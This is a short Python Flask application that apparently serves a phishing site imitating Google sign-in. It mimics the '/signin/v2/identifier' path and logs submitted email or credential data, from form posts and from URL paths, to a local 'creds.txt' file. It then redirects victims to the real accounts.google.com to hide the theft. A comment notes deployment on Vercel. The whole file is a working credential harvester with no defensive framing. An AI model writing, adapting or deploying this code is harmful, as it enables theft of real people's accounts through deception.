from flask import Flask, request, render_template, redirect
from urllib.parse import unquote

app = Flask(__name__)

@app.route("/")
def page1():
    return render_template("page1.html")

@app.route("/signin/v2/identifier")
def page2():
    return render_template("page2.html")

@app.route("/logger/<int:func>", methods=["GET", "POST"])
def logger(func):
    if request.method == "POST":
        data = request.form.get("emailid")
        if data:
            with open("creds.txt", "a") as f:
                f.write(data + "\n")

        if func == 1:
            return redirect("/signin/v2/identifier")
        elif func == 2:
            return redirect("https://accounts.google.com")

        return "Function not handled", 400

    return "GET method not supported on this route", 405

@app.route("/logger/<path:data>/<int:func>", methods=["GET", "POST"])
def logger1(data, func):
    data = unquote(data)
    if data:
        with open("creds.txt", "a") as f:
            f.write(data + "\n")

    if func == 1:
        return redirect("/signin/v2/identifier")
    elif func == 2:
        return redirect("https://accounts.google.com")

    return "Function not handled", 400

if __name__ == "__main__":
    # Jangan jalankan app.run() saat deploy di Vercel
    # app.run()
    pass
